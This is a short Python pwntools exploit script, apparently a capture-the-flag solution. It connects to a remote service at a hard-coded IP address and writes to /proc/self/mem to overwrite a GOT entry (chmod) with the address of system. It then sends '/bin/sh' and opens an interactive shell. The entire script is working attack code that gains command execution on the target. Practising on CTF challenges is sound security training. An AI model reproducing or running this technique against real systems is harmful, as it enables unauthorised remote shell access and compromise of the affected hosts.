from pwn import *

# p = process('./server.py')
p = remote('13.234.59.79', 7000)
# p = remote('localhost', 5002)
# elf = ELF('/usr/bin/python3.6')

python_base = 0x400000

# log.info('offset: ' + hex(elf.got['chmod']))
# log.info('write: ' + hex(elf.plt['system']))
# offset = elf.got['chmod']
# write = elf.plt['system']
# offset = 0x9b4028
# write = 0x41f4e0
offset = 0x9b4028
write = 0x41f4e0
p.sendlineafter('file: ', '/proc/self/mem')
p.sendlineafter('offset: ', str(offset))
p.sendlineafter('write: ', str(p64(write)))

# gdb.attach(p)
p.sendlineafter('file: ', '/bin/sh')


p.interactive()
